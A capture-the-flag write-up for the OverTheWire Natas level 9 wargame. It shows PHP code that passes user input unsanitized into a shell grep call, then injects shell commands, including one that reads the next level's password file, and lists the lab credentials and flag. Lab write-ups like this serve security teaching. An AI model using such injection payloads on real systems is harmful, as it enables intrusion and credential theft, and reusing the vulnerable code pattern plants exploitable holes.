# Natas9

*	user: `natas9`
*	pass: `W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`
*	url: `http://natas9.natas.labs.overthewire.org`
*	flag: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`

## Procedure

1.	Let's click on `View sourcecode`

		<pre>
		<?
		$key = "";

		if(array_key_exists("needle", $_REQUEST)) {
			$key = $_REQUEST["needle"];
		}

		if($key != "") {
			passthru("grep -i $key dictionary.txt");
		}
		?>
		</pre>

2.	The way to call `grep` command seems to be vulnerable to commands
	injection. Let's try to set value of `needle` parameter to
	`; ls -l ;`

		total 480
		drwxr-x---  2 natas9 natas9   4096 Nov 14 10:32 .
		drwxr-xr-x 34 root   root     4096 Nov 15 17:17 ..
		-rw-r-----  1 natas9 natas9    118 Nov 14 10:32 .htaccess
		-rw-r-----  1 natas9 natas9     42 Nov 14 10:32 .htpasswd
		-rw-r-----  1 natas9 natas9 460878 Nov 14 10:27 dictionary.txt
		-rw-r-----  1 natas9 natas9   1952 Nov 14 10:32 index-source.html
		-rw-r-----  1 natas9 natas9   1185 Nov 14 10:32 index.php
		-rw-r-----  1 natas9 natas9   1165 Nov 14 10:27 index.php.tmpl

3.	Let's try the same path suggested in Natas7. By injecting the
	following code

		; cat /etc/natas_webpass/natas10 ;

	the result is

		nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
